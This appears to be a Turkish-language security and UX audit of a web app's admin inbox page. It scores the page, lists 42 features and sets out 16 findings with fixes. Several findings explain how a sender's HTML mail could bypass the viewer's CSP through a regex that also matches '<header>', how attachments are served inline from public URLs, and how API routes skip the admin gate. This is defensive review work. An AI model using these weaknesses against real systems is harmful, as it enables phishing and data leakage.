# /admin/inbox

**Amaç:** Şirket Gmail hesabının (IMAP) gelen kutusunu panele çekip DB'de saklamak, stajyer/görev alıcılarından gelen mailleri otomatik ayırmak, mailleri güvenli (sandbox'lı) okumak, ekleri indirmek ve uygulama içinden thread başlıklı yanıt göndermek.

**Genel puan:** 5.5 / 10 · **Karar:** koru-iyileştir. Çekirdek akış (senkron, stajyer eşleştirme, okuma, yanıt) çalışıyor, ama güvenlik sertleştirmesi (HTML mail CSP'sinin atlatılabilmesi, ek dosyalarının public ve `inline` sunulması), veri bütünlüğü (son 40 mail penceresi, bozuk References zinciri) ve temel posta kutusu işlemleri (sayfalama, okunmadı yapma, arşiv, thread görünümü) eksik.

İncelenen dosyalar: `app/admin/inbox/page.tsx`, `app/admin/layout.tsx`, `app/api/admin/inbox/route.ts`, `app/api/admin/inbox/[id]/route.ts`, `app/api/admin/compose-mail/route.ts`, `lib/mail-inbox.ts`, `lib/r2-storage.ts`, `lib/api-auth.ts`, `proxy.ts`, `app/api/cron/inbox-sync/route.ts`, `app/api/cron/daily/route.ts`, `app/api/cron/attachment-backfill/route.ts`, `prisma/schema.prisma` (`InboxMessage`, satır 938-972), `components/dashboard/sidebar.tsx:214`.

---

## Puan kartı

| Boyut | Puan | Gerekçe |
|---|---|---|
| İşlevsellik | 6/10 | Senkron, filtre, okuma, ekler ve yanıt çalışıyor; ama liste 100 kayıtla sınırlı, okunmadı yapma/arşiv yok, senkron yalnızca son 40 maile bakıyor, yanıt thread zincirini bozuyor. |
| UX | 5/10 | Arama her tuş vuruşunda iskelete dönüyor, sayılar üç yerde tekrarlanıyor, tıklanamayan "okunmadı" etiketi filtre gibi görünüyor, açma hatası sonsuz spinner'da kalıyor, son senkron zamanı görünmüyor. |
| Görsel | 6/10 | İki kolonlu, okunaklı ve admin hero'suyla tutarlı; ama emoji rozetleri (⚠️ 🧵 ✓) lucide ikon diliyle çelişiyor, HTML mailler uzak görselleri olmadan "kırık" görünüyor. |
| Mimari | 5/10 | Tamamen client-side `useState`/`fetch`, istek iptali ve yarış koruması yok; API'de hatalar `.catch(() => [])` ile yutuluyor; `matchedTemplateId` ve `inbox_sync_last_run` yazılıyor ama hiç okunmuyor. |
| Performans | 6/10 | Her tuş vuruşu 4 DB sorgusu (liste + 3 `count`); senkronda mail başına ayrı `findUnique` (N+1) ve sıralı R2 yüklemesi. Ölçek küçük olduğu için şimdilik tolere edilebilir. |
| Erişilebilirlik + mobil | 4/10 | Liste/sekme butonlarında `aria-current`/`aria-pressed` yok, arama ve yanıt alanında etiket yok, klavye gezintisi yok, `animate-in` için azaltılmış hareket desteği yok; mobilde 3 kolonlu stat kartları ~400px'te sıkışıyor. |

---

## Özellik envanteri

| # | Özellik | Durum | Kanıt | Not |
|---|---|---|---|---|
| 1 | Hero başlık + açıklama | KISMİ | `page.tsx:177-181` | Adres `qratex.co@gmail.com` sabit kodlu; gerçek hesap env'den geliyor (`lib/mail-inbox.ts:33`), farklı olabilir. |
| 2 | IMAP yapılandırma uyarı kartı | ÇALIŞIYOR | `page.tsx:183-189`, `route.ts:50` | `isInboxConfigured()` sonucuna bağlı. |
| 3 | Stat: Toplam mail | ÇALIŞIYOR | `page.tsx:193`, `route.ts:44` | Global sayı; liste 100'le sınırlı olduğu için listeyle uyuşmayabilir. |
| 4 | Stat: Stajyerden | ÇALIŞIYOR | `page.tsx:194`, `route.ts:45` | |
| 5 | Stat: Okunmadı | ÇALIŞIYOR | `page.tsx:195`, `route.ts:46`, `page.tsx:133` | Açınca yerelde 1 düşürülüyor. Aynı okunmamış maile hızlı çift tıklama 2 düşürebilir (stale closure). |
| 6 | Arama (kişi, konu) | KISMİ | `page.tsx:53,82-100,204`, `route.ts:25-32` | Debounce yok, istek iptali yok, sıra dışı yanıt eski sonucu gösterebilir; gövde/snippet/departman aranmıyor. |
| 7 | "Yenile" (IMAP senkron) | KISMİ | `page.tsx:102-118`, `route.ts:56-76`, `mail-inbox.ts:68-69` | Yalnızca sequence'a göre son 40 mail; iki senkron arasında 40'tan fazla mail gelirse eskiler hiç çekilmiyor. |
| 8 | Filtre: Tümü | ÇALIŞIYOR | `page.tsx:213` | |
| 9 | Filtre: Stajyerler | ÇALIŞIYOR | `page.tsx:214`, `route.ts:24` | |
| 10 | "X okunmadı" etiketi | KISMİ | `page.tsx:215-219` | Filtre çipiyle aynı satırda, çip gibi görünüyor ama `span`; tıklanmıyor (yanıltıcı affordance). Bir okunmamış filtresi de yok. |
| 11 | Liste yükleniyor iskeleti | ÇALIŞIYOR | `page.tsx:222-223` | Her tuş vuruşunda listeyi iskelete çeviriyor (titreme). |
| 12 | Boş durum | KISMİ | `page.tsx:224-227`, `route.ts:43-46` | DB hatası `.catch(() => [])` ile yutulduğu için hata, "Henüz mail çekilmedi" olarak görünüyor. |
| 13 | Liste öğesi (gönderen, tarih, konu, snippet) | ÇALIŞIYOR | `page.tsx:230-266` | Tarihte yıl yok (`page.tsx:45-46`). |
| 14 | Okunmadı noktası + kalın yazı | ÇALIŞIYOR | `page.tsx:239-240` | Ekran okuyucu için metin yok. |
| 15 | Bounce (iletilemedi) rozeti | ÇALIŞIYOR | `page.tsx:248-252`, `mail-inbox.ts:108-110` | Emoji ikonu kullanılıyor. |
| 16 | Thread (konuşma) sayısı rozeti | KISMİ | `page.tsx:170-173,253-257` | Yalnızca yüklenen ve filtrelenmiş ≤100 mail içinde sayıyor; thread görünümü yok; kökler yanıt zincirinde kayıyor (Bulgu 4). |
| 17 | Stajyer eşleşme rozeti (liste) | ÇALIŞIYOR | `page.tsx:258-262`, `mail-inbox.ts:49-56,151` | |
| 18 | Sayfalama / "daha fazla yükle" | EKSİK | `route.ts:36` (`take: 100`) | 100'den eski mailler panelden erişilemiyor, bunu gösteren bir işaret de yok. |
| 19 | Mail açma (detay + okundu işaretleme) | KISMİ | `page.tsx:120-139,275-276`, `[id]/route.ts:16-22` | Hata olunca `openMsg=null` kalıyor ve spinner sonsuza dek dönüyor; hızlı tıklamada yarış var. |
| 20 | Mobil liste ↔ detay geçişi + "Listeye dön" | ÇALIŞIYOR | `page.tsx:200,281-283` | |
| 21 | Detay başlığı (konu, gönderen, tarih) | ÇALIŞIYOR | `page.tsx:284-289` | `toEmail` çekiliyor ama gösterilmiyor; CC hiç saklanmıyor. |
| 22 | Görev alıcısı rozeti (detay) | ÇALIŞIYOR | `page.tsx:290-294` | |
| 23 | Ekler (liste + indirme) | KISMİ | `page.tsx:297-328`, `mail-inbox.ts:112-138`, `r2-storage.ts:49-64` | Public, süresiz R2 URL'si; tüm türler `inline` sunuluyor (HTML/SVG dahil); cross-origin linkte `download` attr yok sayılıyor. |
| 24 | HTML gövde (sandbox'lı iframe + CSP) | KISMİ | `page.tsx:331-338,427-436` | CSP enjeksiyonu atlatılabiliyor (Bulgu 1); uzak görseller açılamıyor; linkler çalışmıyor. |
| 25 | iframe otomatik yükseklik | ÇALIŞIYOR | `page.tsx:66-80,430` | `postMessage`'ın kaynağı doğrulanmıyor (değer kırpıldığı için düşük risk). |
| 26 | Düz metin gövde yedeği | ÇALIŞIYOR | `page.tsx:339-341` | |
| 27 | "İstemcide aç" (mailto) | ÇALIŞIYOR | `page.tsx:347-353` | Konu zaten "Re:" ise "Re: Re:" üretiyor. |
| 28 | Uygulama içi "Yanıtla" | KISMİ | `page.tsx:142-167,343-382`, `compose-mail/route.ts:11-63` | References zinciri yanlış, 200 karakter üstü konuda İngilizce zod hatası, giden yanıt hiçbir yere kaydedilmiyor, alıntı/imza yok. |
| 29 | Yanıt "Vazgeç" | ÇALIŞIYOR | `page.tsx:373-375` | Taslak sorulmadan siliniyor. |
| 30 | Okunmadı olarak işaretle | EKSİK | `route.ts:79-90` (API var), UI'da çağrı yok | PATCH ucu ölü kod; ayrıca hataları yutup yine `success: true` dönüyor. |
| 31 | Arşivle / sil / spam | EKSİK | — | Gmail'de silinen mail DB'de kalıyor, panelden silinemiyor. |
| 32 | Son senkron zamanı / durumu | EKSİK | `cron/inbox-sync/route.ts:36-44` | `inbox_sync_last_run` Settings'e yazılıyor ama repoda okuyan yok (grep: tek eşleşme yazan dosya). |
| 33 | Otomatik senkron (cron) | KISMİ | `cron/daily/route.ts:54`, `cron/inbox-sync/route.ts:35` | Günde 1 kez, son 40 mail; yoğun bir günde mail kaybı riski var. |
| 34 | Okunmamış / bounce / ekli filtresi | EKSİK | `route.ts:20` | API yalnızca `all|intern` biliyor; `isBounce` indeksli olduğu halde filtrelenmiyor. |
| 35 | Yetki (ADMIN rolü + gizli kapı) | KISMİ | `proxy.ts:79-88` (sayfa), `proxy.ts:104-117` + `api-auth.ts:52-79` (API) | Sayfa gate cookie istiyor; API uçları yalnızca rol kontrolü yapıyor (Bulgu 3). |
| 36 | Senkron rate-limit | ÇALIŞIYOR | `route.ts:61-64` | Kullanıcı başına dakikada 6. |
| 37 | Seçim yokken boş okuma paneli | ÇALIŞIYOR | `page.tsx:387-393` | |
| 38 | Klavye gezintisi (j/k, e, r, u) | EKSİK | — | |
| 39 | Konuşma (thread) görünümü | EKSİK | — | `threadRoot` var, gruplu okuma yok; giden yanıtlar thread'de görünmüyor. |
| 40 | Stajyer görev şablonuna bağ ("yanıt geldi") | EKSİK | `mail-inbox.ts:162` | `matchedTemplateId` yazılıyor, repoda hiçbir yerde okunmuyor; `/admin/intern-emails` paneli yanıt durumunu bilmiyor. |
| 41 | Saklama süresi / KVKK temizliği | EKSİK | `cron/db-cleanup` içinde `inboxMessage` yok | Stajyer kişisel verisi ve ekler süresiz tutuluyor. |
| 42 | Okuma/yanıt denetim kaydı | EKSİK | `compose-mail/route.ts` (audit çağrısı yok) | Herhangi bir ADMIN şirket adresinden herhangi bir adrese iz bırakmadan mail atabiliyor. |

**Sayım:** 42 özellik · 20 ÇALIŞIYOR · 12 KISMİ · 0 BOZUK · 0 SAHTE · 10 EKSİK.

---

## Bulgular

### 1. HTML mail CSP'si `<header>` etiketiyle atlatılabiliyor, kendi kendine navigasyon da engellenmiyor
- **Önem:** yüksek · **Kategori:** güvenlik · **Efor:** M
- **Kanıt:** `page.tsx:431` → `if (/<head[^>]*>/i.test(html)) html = html.replace(/<head[^>]*>/i, (m) => m + meta);`. Bu regex `<header ...>` etiketiyle de eşleşiyor (`<head` + `er` + `>`). `page.tsx:428` → `script-src 'unsafe-inline'`. `page.tsx:334` → `sandbox="allow-scripts"`.
- **Sorun:**
  - (a) `<head>` etiketi olmayan ama `<header>` içeren bir HTML mailde (ya da `<head` metni içeren bir yorumda), CSP `<meta>`'sı body'nin içine yerleşiyor. Tarayıcılar `head` dışındaki CSP meta'sını yok sayar. Bu durumda gönderenin uzak görselleri (izleme pikseli, admin IP'si, "açıldı" sinyali) ve inline script'leri kısıtsız çalışır. Script'ler opak origin'de çalıştığı için çerez çalamaz, ama `fetch` ile dışarıya veri gönderebilir.
  - (b) CSP düzgün yerleşse bile `'unsafe-inline'` yalnızca bizim yükseklik script'imize değil, **göndericinin script'lerine de** izin veriyor. Sandbox iframe'in kendi içinde gezinmesini (link tıklama, `location=`, büyük olasılıkla `<meta http-equiv=refresh>`) engellemiyor, CSP'de de `navigate-to` yok. Saldırgan admin panelinin içinde kendi sayfasını (sahte bir giriş ekranı gibi) yükleyebilir ve IP sızdırabilir.
  - Satır 421-426'daki yorumdaki "harici hiçbir istek yapılamaz" iddiası bu yüzden doğru değil. Tarayıcıda denenmedi; kod okunarak tespit edildi. Meta refresh davranışı **doğrulanmadı**.
- **Profesyonel öneri:**
  - HTML'i **sunucuda** `sanitize-html`/DOMPurify (jsdom) ile temizleyin: `script`, `on*`, `meta[http-equiv=refresh]`, `form`, `base` ve `javascript:` URL'leri kaldırılsın. Bunu senkron sırasında `bodyHtmlSafe` alanı olarak saklayın.
  - Yükseklik script'ini `'unsafe-inline'` yerine **hash'li** CSP ile çalıştırın (`script-src 'sha256-…'`), böylece göndericinin script'i hiç çalışmaz.
  - Meta enjeksiyonunu regex yerine bir DOM parse adımıyla yapın (sunucuda `parse5` ya da istemcide `DOMParser`), CSP her zaman gerçek `<head>`'e girsin.
  - Linkleri `target="_blank" rel="noopener noreferrer"` olarak yeniden yazıp sandbox'a `allow-popups allow-popups-to-escape-sandbox` ekleyin. Böylece mail içi navigasyon iframe'i ele geçiremez, linkler de gerçekten çalışır.

### 2. Gelen ekler public, süresiz URL'lerde ve her türde `inline` olarak sunuluyor
- **Önem:** yüksek · **Kategori:** güvenlik / veri gizliliği · **Efor:** M
- **Kanıt:** `mail-inbox.ts:133` → `uploadToR2(key, content, contentType, \`inline; filename="${safeName}"\`)` tüm türler için çağrılıyor, `contentType` göndericiden geliyor. `r2-storage.ts:58-63` public URL döndürüyor. Aynı projede `cron/attachment-backfill/route.ts:24-28` `inline`'ı bilerek yalnızca `image/*`, `video/*` ve `pdf` ile sınırlıyor ("attachment kalması doğru").
- **Sorun:**
  - Dışarıdan gelen bir `text/html` veya `image/svg+xml` ek, R2 public domain'inde **çalıştırılabilir içerik** olarak açılıyor. R2 domain'i uygulamanın bir alt alan adıysa çerez ve origin riski var; bu **doğrulanmadı** (R2_PUBLIC_URL değeri okunmadı).
  - Stajyerlerden gelen belgeler (CV, kimlik vb. olabilir) kimlik doğrulamasız, süresi dolmayan URL'lerde duruyor. Key'de `uid`+`Date.now()` var, tahmin edilmesi zor ama URL bir kez paylaşılırsa sonsuza dek açık kalır.
  - Senkron kodu ile backfill cron'u arasında tutarsızlık var.
- **Profesyonel öneri:** Ekleri private bucket'a koyun ve `GET /api/admin/inbox/[id]/attachments/[n]` ucundan `requireAuth(['ADMIN'])` + kısa ömürlü presigned URL (ör. 5 dk) ile 302 yönlendirmesi yapın. `inline` yalnızca izin listesindeki türlere verilsin (`image/png|jpeg|gif|webp`, `application/pdf`, `video/mp4`). Geri kalan her şey `attachment` + `X-Content-Type-Options: nosniff` ile sunulsun. SVG her zaman `attachment` olsun.

### 3. API uçları admin gizli kapısını uygulamıyor
- **Önem:** yüksek · **Kategori:** yetki (sistem geneli) · **Efor:** M
- **Kanıt:** `proxy.ts:79-88` gate cookie kontrolünü yalnızca `/admin` sayfa yollarında yapıyor. `/api/` dalında (`proxy.ts:104-117`) yalnızca header ekleniyor. `requireAuth` (`api-auth.ts:52-79`) rol ve token replay'e bakıyor, gate'e bakmıyor.
- **Sorun:** Gate'in amacı "rolü kazara ADMIN yapılmış biri bile gizli cevabı bilmeden panele giremesin" (`proxy.ts:76-77`). Ama böyle biri `GET /api/admin/inbox` ve `/api/admin/inbox/[id]` ile tüm stajyer maillerini okuyabilir, `POST /api/admin/compose-mail` ile şirket adresinden istediği yere mail atabilir. Bu sayfaya özgü değil, ama bu sayfanın verisi en hassas olanlardan biri.
- **Profesyonel öneri:** Gate kontrolünü `requireAuth`'a ekleyin; örneğin `allowedRoles` içinde `ADMIN` varsa `cookies().get('admin_gate')` ile `gateCookieBelongsTo` doğrulaması yapılsın. Ya da `proxy.ts`'in `/api/admin/*` dalında JWT'yi okuyup aynı kontrolü uygulayın. Gate'i açıkça muaf tutması gereken uçlar (gate'in kendi API'si) bir izin listesine alınsın.

### 4. Uygulama içi yanıt References zincirini bozuyor; thread gruplaması bir sonraki turda kopuyor
- **Önem:** orta · **Kategori:** veri bütünlüğü · **Efor:** S
- **Kanıt:** `compose-mail/route.ts:53-55` → `{ 'In-Reply-To': inReplyTo, References: inReplyTo }`. `page.tsx:154` yalnızca `messageId` gönderiyor. Thread kökü `mail-inbox.ts:104-105`'te `References[0]` olarak hesaplanıyor.
- **Sorun:** RFC 5322'ye göre References, ebeveynin References'ı ile ebeveynin Message-ID'sinin birleşimi olmalı. Şu anki haliyle karşı tarafın bir sonraki cevabında `References[0]` artık asıl kök değil, yanıtlanan mesajın id'si oluyor. Bu yüzden `threadRoot` değişiyor ve aynı konuşma panelde iki ayrı thread gibi sayılıyor (`page.tsx:170-173`). Gmail/Outlook'ta da zincirleme bozulabilir.
- **Profesyonel öneri:** Page `inReplyTo` ile birlikte `references` gönderebilmeli; daha iyisi compose-mail yalnızca `replyToInboxId` alsın, mesajı DB'den okuyup `References = [msg.references, msg.messageId].join(' ')` (998 karakter sınırında baştan kırpılmış) üretsin. İstemciden header kabul etmemek ayrıca sertleştirme sağlar.

### 5. Senkron, sequence'a göre yalnızca son 40 mail; aradaki mailler kalıcı olarak kaçırılıyor
- **Önem:** orta · **Kategori:** veri bütünlüğü · **Efor:** M
- **Kanıt:** `mail-inbox.ts:68-69` → `start = Math.max(1, total - limit + 1); range = \`${start}:*\``. Cron günde 1 kez `syncInbox(40)` çalıştırıyor (`cron/daily/route.ts:54`, `cron/inbox-sync/route.ts:35`). Manuel senkron da 40 (`page.tsx:107`). UIDVALIDITY saklanmıyor (`schema.prisma:966` sadece `[mailbox, uid]`).
- **Sorun:**
  - İki senkron arasında 40'tan fazla mail gelirse (bülten, bildirim ve bounce'larla kolayca olur), aradakiler hiçbir zaman DB'ye girmez ve stajyer yanıtı kaybolabilir.
  - Gmail UIDVALIDITY'yi değiştirirse yeni mailler eski UID'lerle çakışır ve `exists` olarak atlanır (`mail-inbox.ts:76-78`).
- **Profesyonel öneri:** `Settings`'te `{ uidValidity, lastUid }` saklayın ve `client.fetch({ uid: \`${lastUid+1}:*\` }, …, { uid: true })` ile **UID tabanlı artımlı** senkron yapın. UIDVALIDITY değişirse tam yeniden eşleme (messageId üzerinden dedupe) yapılsın. Zaman bütçesine (`maxDuration`) göre batch'leyip kalan olursa sonucu `hasMore: true` döndürün. Mevcut `exists` kontrolünü de tek `findMany({ where: { uid: { in: uids } } })` ile toplu yapın (N+1'i kaldırır).

### 6. Arama ve mail açmada yarış koşulları; açma hatası sonsuz spinner'a düşüyor
- **Önem:** orta · **Kategori:** hata / UX · **Efor:** S
- **Kanıt:** `page.tsx:82-100`: `query` her değiştiğinde `load` yeniden oluşuyor ve effect fetch atıyor; `AbortController` ya da istek sırası kontrolü yok. `page.tsx:120-139`: `openMessage` yanıtı geldiğinde `openId` hâlâ aynı mı diye bakmıyor. `page.tsx:275`: `openLoading || !openMsg` → hata durumunda `openMsg` null kaldığı için spinner sonsuza dek dönüyor.
- **Sorun:** Hızlı yazarken eski bir sorgunun yanıtı yeninin üzerine yazılabiliyor. A'ya sonra B'ye hızlı tıklanınca B seçiliyken A'nın içeriği gösterilebiliyor. Mail silinmişse ya da 404/403 dönerse okuma paneli kilitleniyor ve kullanıcıya yeniden deneme imkânı sunulmuyor.
- **Profesyonel öneri:** Veri katmanını SWR/React Query'ye taşıyın (`useSWR(['inbox', filter, debouncedQ])`, `keepPreviousData`); arama 250 ms debounce'lu olsun. Detayı `useSWR(openId && \`/api/admin/inbox/${openId}\`)` ile çekin; anahtar değişince eski yanıt zaten yok sayılır. Ayrı bir `openError` durumu ile "Mail açılamadı · Tekrar dene" kartı gösterin. Optimistic okundu güncellemesini `mutate` ile yapın.

### 7. API hataları yutuluyor; DB arızası "boş gelen kutusu" gibi görünüyor
- **Önem:** orta · **Kategori:** hata yönetimi · **Efor:** S
- **Kanıt:** `route.ts:43-46` her sorguda `.catch(() => [] / 0)`; `route.ts:88` PATCH'te `.catch(() => {})` sonrası `success: true`; `[id]/route.ts:16` `findUnique().catch(() => null)` → 404.
- **Sorun:** Neon uykuda/erişilemezken admin "Henüz mail çekilmedi. Yenile'ye bas." görüyor (`page.tsx:226`), bastığında senkron da DB'ye yazamadığı halde `stored: 0` ile başarılı dönebiliyor. DB hatası 404 "Mail bulunamadı" olarak raporlanıyor.
- **Profesyonel öneri:** Liste ve sayaçlar için hata yutmayın; `try/catch` ile 503 + `{ error: 'Veritabanına ulaşılamadı' }` döndürün, UI'da kalıcı bir hata bandı + "Tekrar dene" gösterin. PATCH'te P2025'i 404'e çevirin. Hataları `console.error` yerine yapılandırılmış log/Sentry'ye gönderin.

### 8. Yanıt gönderimi: konu sınırı İngilizce hata veriyor, giden yanıt kaydedilmiyor, denetim kaydı yok
- **Önem:** orta · **Kategori:** işlevsellik / uyumluluk · **Efor:** M
- **Kanıt:** `compose-mail/route.ts:13` → `subject ... .max(200)`, mesaj alanında özel mesaj yok, zod varsayılanı İngilizce ("String must contain at most 200 character(s)"); `page.tsx:146` "Re: " + orijinal konu. `compose-mail/route.ts:57-79`'da DB'ye ya da audit log'a yazma yok. `page.tsx:160-161` başarıdan sonra yalnızca formu kapatıyor.
- **Sorun:** 196 karakterden uzun konulu bir maile yanıt verilemiyor ve admin İngilizce bir hata görüyor. Gönderilen yanıt panelde hiçbir yerde görünmüyor ("bunu yanıtladım mı?" sorusu yanıtsız kalıyor), thread'e eklenmiyor ve kimin neyi gönderdiği izlenemiyor. Yanıtta orijinal mesaj alıntılanmıyor; yanıt `buildAdminComposeEmail` ile pazarlama tarzı bir şablona sarılıyor (kişisel yanıt için uygun olmayabilir, görsel olarak **doğrulanmadı**).
- **Profesyonel öneri:** `OutboundMail` (ya da `InboxMessage.direction='out'`) kaydı tutun: `inReplyToId`, `sentByUserId`, `providerMessageId`, `threadRoot`. `InboxMessage`'a `repliedAt` ekleyin, listede "Yanıtlandı" rozeti gösterin. Konuyu sunucuda 200'e kırpın (ya da sınırı 998'e çıkarın), zod mesajlarını Türkçeleştirin. Yanıtta "Şu tarihte X şunu yazdı:" alıntısı ile sade bir "kişisel yanıt" şablonu seçeneği sunun. `auditLog({ action: 'inbox.reply', target: messageId })` çağrısı ekleyin.

### 9. Listede sayfalama yok, sayılar listeyle tutarsız
- **Önem:** orta · **Kategori:** işlevsellik / bilgi mimarisi · **Efor:** S
- **Kanıt:** `route.ts:36` `take: 100`; sayaçlar `route.ts:44-46`'da filtre ve aramadan bağımsız global sayılar; `page.tsx:213-214` çiplerde bu global sayılar gösteriliyor.
- **Sorun:** "Tümü (430)" yazarken listede 100 kayıt var ve sonuna gelindiğinde bir işaret yok. Arama yapınca çip sayıları değişmiyor, bu yüzden "kaç sonuç bulundu" bilinmiyor.
- **Profesyonel öneri:** `(sentAt, id)` cursor'lu sayfalama + liste sonunda `IntersectionObserver` ile sonsuz kaydırma; yanıtta `nextCursor` ve `matchedTotal` alanları. Çiplerde filtre sonucu sayısı, stat kartlarında global sayılar olsun. Sayaçları 30 sn Redis cache'e alın; her tuş vuruşunda 3 `count` atılmasın.

### 10. Ölü veri ve ölü uçlar: `matchedTemplateId`, `inbox_sync_last_run`, PATCH
- **Önem:** düşük · **Kategori:** mimari / ölü kod · **Efor:** S
- **Kanıt:** `mail-inbox.ts:162` `matchedTemplateId` yazılıyor; grep sonucu okuyan yok. `cron/inbox-sync/route.ts:10,40-44` "durum paneli okur" yorumuyla yazıyor, okuyan yok. `route.ts:79-90` PATCH'i UI çağırmıyor.
- **Sorun:** "Son senkron ne zaman, başarılı mı?" bilgisi toplanıyor ama gösterilmiyor. Stajyer yanıtları görev şablonuna bağlanıyor ama `/admin/intern-emails` bu bilgiyi kullanmıyor.
- **Profesyonel öneri:** Liste başlığına "Son senkron: 3 sa önce · otomatik (günlük)" satırı ekleyin, hata varsa kırmızı göstersin. PATCH'i "Okunmadı olarak işaretle" aksiyonuna bağlayın. `matchedTemplateId` ile `/admin/intern-emails` gönderim panelinde "Yanıt geldi (2) → Gelen kutusunda aç" bağlantısı kurun (Bulgu 15).

### 11. Erişilebilirlik: rol/durum semantiği, etiketler ve klavye desteği eksik
- **Önem:** orta · **Kategori:** erişilebilirlik · **Efor:** M
- **Kanıt:** Liste öğeleri `button` ama seçili durum için `aria-current`/`aria-selected` yok (`page.tsx:233-237`). FilterChip'te `aria-pressed` yok (`page.tsx:442-451`). Arama `Input`'unda yalnız placeholder var, etiket yok (`page.tsx:204`). `textarea`'da etiket yok (`page.tsx:364-371`). Okunmadı noktası yalnızca görsel (`page.tsx:239`). iframe `title="mail"` (`page.tsx:333`). Emoji rozetleri ekran okuyucuda "uyarı işareti", "iplik" diye okunuyor (`page.tsx:250,255`).
- **Sorun:** Ekran okuyucu kullanıcısı hangi mailin seçili ya da okunmamış olduğunu bilemiyor. Klavyeyle listede gezinme her öğe için ayrı Tab gerektiriyor. Mail açılınca odak okuma paneline taşınmıyor, mobilde "Listeye dön"de odak listeye geri dönmüyor.
- **Profesyonel öneri:** Listeyi `role="listbox"` + roving tabindex (↑/↓, Enter) olarak kurun, seçilene `aria-selected` verin. Okunmamışlar için `<span className="sr-only">Okunmadı</span>`. Çiplere `role="tab"`/`aria-selected` ya da `aria-pressed` ekleyin. `aria-label="Gelen kutusunda ara"`. iframe başlığı `"Mail içeriği: {konu}"` olsun. Mail açılınca başlığa `focus()`. Emoji yerine lucide `AlertTriangle`/`MessageSquare` + `aria-hidden` kullanın.

### 12. Mobil yerleşim ve hareket
- **Önem:** düşük · **Kategori:** mobil / motion · **Efor:** S
- **Kanıt:** `page.tsx:192` `grid-cols-3`, StatCard `p-4` + 40px ikon + `text-2xl` (`page.tsx:409-413`). `page.tsx:236` her liste öğesinde `animate-in fade-in slide-in-from-left-1`; `motion-reduce:` varyantı yok. `page.tsx:408` hover'da `-translate-y-0.5`.
- **Sorun:** ~400px'te üç kart sığmıyor, etiketler kesiliyor. Mobilde mail açıkken stat kartları üstte kalıyor ve okuma alanını aşağı itiyor. Liste her yeniden yüklendiğinde (her tuş vuruşu dahil) tüm öğeler yeniden kayarak giriyor: dikkat dağıtıcı, azaltılmış hareket tercihine de uymuyor.
- **Profesyonel öneri:** Mobilde stat kartlarını tek satırlık kompakt bir "özet şeridi"ne çevirin (`sm:grid-cols-3`, mobilde yatay kaydırmalı çipler) ve mail açıkken gizleyin. Giriş animasyonunu yalnızca ilk yüklemede ve yeni gelen maillerde (diff ile) oynatın, `motion-reduce:animate-none` ekleyin. Mobilde okuma ekranını tam ekran sheet olarak açın (geri jesti, sticky yanıt çubuğu).

### 13. HTML mail okunabilirliği: uzak görseller engelli ve "göster" seçeneği yok, linkler çalışmıyor
- **Önem:** düşük · **Kategori:** UX · **Efor:** M
- **Kanıt:** `page.tsx:428` `img-src data:`; sandbox'ta `allow-popups` yok (`page.tsx:334`).
- **Sorun:** Gizlilik açısından doğru bir varsayılan, ama kullanıcıya hiçbir bildirim ve seçenek sunulmuyor. Bültenler ve stajyerlerin gönderdiği ekran görüntüsü linkleri kırık görünüyor. `target=_blank` linkler hiçbir şey yapmıyor, diğerleri iframe'in içinde açılıyor.
- **Profesyonel öneri:** Gmail desenini uygulayın: "Bu mailde uzak görseller engellendi · Göster" bandı. Görseller sunucuda bir görsel proxy'sinden (`/api/admin/inbox/img?u=`, boyut/tip sınırlı, IP gizleyen) geçsin. Linkleri yeni sekmede açın (Bulgu 1 ile birlikte).

### 14. Saklama politikası yok (KVKK)
- **Önem:** orta · **Kategori:** uyumluluk · **Efor:** S
- **Kanıt:** `InboxMessage` için `db-cleanup`'ta silme yok (grep: `inboxMessage` yalnızca inbox route'ları, `mail-inbox.ts` ve attachment-backfill'de geçiyor). Ekler R2'de süresiz.
- **Sorun:** Stajyer adayı/öğrenci kişisel verisi, ham HTML gövde ve ekler süresiz tutuluyor; Gmail'de silinen mail panelde kalmaya devam ediyor.
- **Profesyonel öneri:** `Settings`'te `inbox_retention_days` (ör. 180) tanımlayın. `db-cleanup` adımında süresi geçen mailleri ve R2 eklerini (`deleteFromR2`) silin. Panelde "Sil" aksiyonu ile Gmail'e `\Deleted`/arşiv yansıtması ekleyin. Gizlilik taleplerindeki (`/admin/privacy-requests`) silme akışına e-posta adresine göre inbox temizliği ekleyin.

### 15. Stajyer mail modülüyle kopuk deneyim
- **Önem:** düşük · **Kategori:** bilgi mimarisi · **Efor:** M
- **Kanıt:** `sidebar.tsx:213-214` iki ayrı menü öğesi (`/admin/intern-emails`, `/admin/inbox`); `intern-emails/page.tsx:387-430` gönderim + açılma durumu var, yanıt durumu yok.
- **Sorun:** Görev maili gönderme, açılma takibi, bounce ve yanıt aynı iş akışının parçaları, ama iki sayfaya bölünmüş ve birbirine bağlantı yok.
- **Profesyonel öneri:** Aşağıdaki "Çakışmalar" bölümüne bakın.

### 16. Küçük tutarlılık sorunları
- **Önem:** düşük · **Kategori:** tutarlılık · **Efor:** S
- **Kanıt ve öneriler:**
  - `page.tsx:348`: mailto konu "Re: Re:" oluyor. Sayfa içi yanıttaki `/^re:/i` kontrolünü burada da kullanın.
  - `page.tsx:45-46`: tarihte yıl yok. Bugün için saat, bu yıl için "12 Eki", eski yıllar için "12.10.2025" kullanılsın.
  - `page.tsx:111,159`: toast'larda "✓" karakteri; diğer admin toast'larıyla tutarlı hale getirin.
  - `route.ts:23`: `where: Record<string, unknown>` Prisma tip güvenliğini kaybediyor; `Prisma.InboxMessageWhereInput` kullanılsın.
  - `[id]/route.ts:20`: GET isteği yan etki (okundu) yapıyor; prefetch ya da önizleme okundu sayılabilir. Okundu işaretlemesini istemcinin açık PATCH'ine taşıyın.
  - `page.tsx:67-73`: `postMessage` kaynağı (`e.source === iframeRef.current?.contentWindow`) doğrulanmıyor.
  - IMAP hata mesajları (`mail-inbox.ts:181`) ham ve İngilizce olarak toast'a düşüyor; bilinen hataları (AUTHENTICATIONFAILED, timeout) Türkçe açıklamaya eşleyin.

---

## Eksik özellikler (kıyas: Gmail, Front, Help Scout, Linear Triage, Intercom Inbox)

1. **Konuşma (thread) görünümü:** gelen ve giden mesajlar aynı akışta, katlanabilir alıntılarla. `threadRoot` hazır, eksik olan giden kayıt ve gruplu sorgu.
2. **Triage aksiyonları:** okunmadı yap, arşivle, sil, yıldız/öncelik, "yanıt bekleniyor" durumu, toplu seçim (checkbox + üst çubuk) ve klavye kısayolları (`j/k`, `e`, `r`, `u`, `#`, `/`).
